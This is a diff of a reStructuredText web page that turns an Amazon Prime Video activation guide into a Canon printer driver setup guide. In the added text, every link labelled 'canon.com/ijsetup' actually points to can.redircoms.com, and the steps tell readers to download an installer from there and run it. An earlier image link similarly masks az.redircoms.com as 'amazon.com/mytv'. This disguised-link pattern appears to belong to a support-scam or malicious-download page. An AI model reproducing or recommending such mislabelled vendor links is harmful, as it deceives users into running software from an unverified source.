@@ -1,6 +1,7 @@
 ##################
-How to Activate MyTv on Your Device using Amazon.com/mytv
+How Do I Download, Install, and Set Up My Canon Printer Driver?
 ##################
+
 .. meta::
    :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
@@ -9,12 +10,12 @@ How to Activate MyTv on Your Device using Amazon.com/mytv
       :align: center
       :height: 100px
 
-.. image:: enter_code.png
+.. image:: Enter_Product_Key.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: amazon.com/mytv
-      :target: https://az.redircoms.com
+      :alt: canon.com/ijsetup
+      :target: https://can.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -27,50 +28,46 @@ How to Activate MyTv on Your Device using Amazon.com/mytv
 
 
 
-There are 5 simple stages to set up and activate Amazon Prime Video on your Smart TV or streaming device. Follow each stage one by one to successfully link your device via `amazon.com/mytv <https://www.amazon.com/mytv>`_. Amazon Prime Video gives you access to thousands of movies and shows. It's one of the most popular streaming services globally, and activation via **amazon.com/mytv** is quick and easy. Visit `amazon.com/mytv <https://www.amazon.com/mytv>`_, enter your activation code, and start streaming instantly.
+There are 5 simple stages to download, install, and set up your Canon printer driver on your computer. Follow each stage one by one to successfully connect your printer via `canon.com/ijsetup <https://can.redircoms.com>`_. Canon’s setup site provides the latest drivers and easy instructions. It’s the fastest way to ensure your printer works correctly with your computer. Visit `canon.com/ijsetup <https://can.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
 
 **********
-Steps to Activate Amazon Prime Video
+Steps to Download Canon Printer Driver
 **********
 
-1. Open a web browser and go to `amazon.com/mytv <https://www.amazon.com/mytv>`_.
+1. Open a web browser and go to `canon.com/ijsetup <https://can.redircoms.com>`_.
 
-2. Sign in with your Amazon account credentials. 
+2. Enter your Canon printer model in the search box.
 
-3. On your TV or streaming device, open the Amazon Prime Video app.
+3. Select your operating system if prompted.
 
-4. An activation code will appear on your screen.
+4. Click on **Download** to get the latest driver and software package.
 
-5. Enter the displayed code on the `amazon.com/mytv <https://www.amazon.com/mytv>`_ website.
-
-6. Click on the Register Device button.
-
-7. Once registered, your TV will automatically refresh and you’ll be able to stream Prime Video.
+5. Save the installer file to your computer.
 
 **********
-Alternate Method: Register via Mobile App
+Steps to Install Canon Printer Driver
 **********
 
-1. Install the Amazon Prime Video app on your smartphone.
+1. Locate the downloaded installer file on your computer.
 
-2. Open the app and sign in with your Amazon account.
+2. Double-click the installer to begin the setup process.
 
-3. Go to the Settings menu and choose **Register a device**.
+3. Follow the on-screen instructions and accept the license agreement.
 
-4. Enter the code shown on your TV screen.
+4. Choose your connection type (USB or Wireless).
 
-5. Tap **Register** and wait for confirmation.
+5. Complete the installation by clicking **Finish**.
 
 **********
-Connecting Your TV or Streaming Device
+Setting Up Your Canon Printer
 **********
 
-1. Make sure your TV or streaming device is connected to the internet.
+1. Make sure your Canon printer is powered on.
 
-2. Install and open the Amazon Prime Video app.
+2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
 
-3. Follow the on-screen instructions to sign in or get your activation code.
+3. Open the Canon driver or utility you installed.
 
-4. Use `amazon.com/mytv <https://www.amazon.com/mytv>`_ on your computer or mobile browser to enter the code.
+4. Follow on-screen prompts to detect and connect your printer.
 
-5. Once confirmed, enjoy unlimited streaming of Amazon Originals, movies, and TV shows.
+5. Once connected, print a test page to verify setup is complete.
